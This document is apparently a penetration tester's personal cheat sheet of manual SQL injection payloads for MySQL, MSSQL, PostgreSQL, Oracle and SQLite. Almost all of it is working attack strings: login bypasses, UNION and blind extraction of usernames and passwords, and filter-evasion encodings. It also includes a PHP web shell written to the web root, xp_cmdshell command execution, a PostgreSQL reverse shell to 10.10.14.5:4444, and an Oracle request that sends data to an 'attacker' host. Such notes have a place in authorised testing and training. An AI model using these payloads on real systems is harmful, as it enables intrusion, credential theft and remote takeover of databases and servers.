---
tags: [pentest, sqli, payloads, web, initial-access]
phase: 5
---
# Manual SQLi Payloads

When you'd rather poke by hand than fire sqlmap. Useful for confirming injection exists and for filter bypass.

[[06 - Gaining Access/00 - README|Folder index]]

## Sanity tests (run these first)

```text
'           ← does the page error?
"
\
1' OR '1'='1
1) OR (1)=(1)
1' OR 1=1 -- -
1' OR 1=1#
1" OR 1=1 -- -
"||1="1
admin'-- -
admin'/*
```

## Auth bypass on login form

```text
' OR 1=1 -- -
' OR ''='
admin'-- -
admin' #
admin')-- -
") OR ("1"="1
```

## UNION-based extraction (when error reveals column count or you guess)

```text
# Find column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 99-- -        ← when this errors, you know how many columns

# Then UNION to extract
' UNION SELECT 1,2,3-- -
' UNION SELECT null,version(),null-- -
' UNION SELECT null,table_name,null FROM information_schema.tables-- -
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT null,concat(username,':',password),null FROM users-- -
```

## MySQL-specific

```text
SELECT @@version
SELECT @@hostname
SELECT @@datadir
SELECT USER()
SELECT DATABASE()
SHOW TABLES
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata
SELECT LOAD_FILE('/etc/passwd')                    ← needs FILE priv
SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/s.php'
```

## MSSQL-specific

```text
SELECT @@version
SELECT system_user
SELECT name FROM sys.databases
SELECT name FROM sys.tables
EXEC xp_cmdshell 'whoami'                          ← needs sysadmin
SELECT * FROM OPENROWSET('SQLNCLI', 'server=...', 'SELECT 1')   ← SSRF style
```

## PostgreSQL-specific

```text
SELECT version()
SELECT current_database()
SELECT datname FROM pg_database
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'    ← RCE if priv
```

## Oracle-specific

```text
SELECT banner FROM v$version
SELECT user FROM dual
SELECT table_name FROM all_tables
SELECT UTL_HTTP.REQUEST('http://attacker/'||user) FROM dual   ← SSRF
```

## SQLite-specific

```text
SELECT sqlite_version()
SELECT name FROM sqlite_master WHERE type='table'
ATTACH DATABASE 'evil.db' AS evil;
```

## Blind / time-based

```text
# Boolean blind (response changes based on truth)
' AND 1=1-- -                ← page renders normally
' AND 1=2-- -                ← page renders differently

# Time-based
' AND SLEEP(5)-- -           ← MySQL
'; WAITFOR DELAY '00:00:05'--  ← MSSQL
'; SELECT pg_sleep(5)--      ← PostgreSQL
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)-- -

# Conditional time-based (extract one bit at a time)
' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a',SLEEP(5),0)-- -
```

## Filter bypass

```text
# Comment alternatives
' OR 1=1#
' OR 1=1/*
' OR 1=1;%00
' OR 1=1 -- -            ← note: space before "-- -" required

# Case change
sElEcT
uNiOn

# Inline comment for space
' UNION/**/SELECT
SELECT/**/version()

# Encoding
%27 OR 1%3D1
'+OR+'1'%3D'1

# Concat alternatives
%2b (URL-encoded +)
char(0x70,0x77,0x6e)            ← string from bytes
0x70776e                        ← hex

# Char-based encoding
char(97)        ← 'a'
unhex(61)       ← 'a'
```

## Quick identification

| Behavior | Likely DBMS |
| --- | --- |
| `'` causes "MySQL syntax error" | MySQL/MariaDB |
| `'` causes "Microsoft OLE DB Provider for SQL Server" | MSSQL |
| `'` causes "ORA-00933" or "ORA-00972" | Oracle |
| `'` causes "PG::Error" or "syntax error at or near" | PostgreSQL |
| `LIMIT 1` works | MySQL/PostgreSQL/SQLite |
| `TOP 1` works | MSSQL |
| `ROWNUM<=1` works | Oracle |

> [!tip] After you confirm injection manually, switch to sqlmap
> Manual is for confirmation and bypass crafting. sqlmap is for extraction.
